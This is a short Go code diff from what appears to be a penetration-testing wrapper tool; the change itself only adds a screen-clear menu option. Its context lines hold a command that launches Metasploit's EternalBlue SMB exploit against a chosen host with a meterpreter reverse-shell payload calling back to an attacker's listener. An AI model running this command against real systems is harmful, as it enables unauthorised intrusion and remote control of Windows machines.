@@ -94,6 +94,8 @@ func SmbExploit(userTarget string) {
             fmt.Println()
             subprocess.PopenFive(`script -q -c "msfdb start; msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'" -O %s`, userTarget, userLhost, userLport, Logs)
             fmt.Println()
+        case "cls", "clear":
+            utils.ClearScreen()
         case "99", "m", "M", "menu", "Menu", "MENU":
             menus.MenuThreeOne()
         case "00", "h", "H", "help", "Help", "HELP":
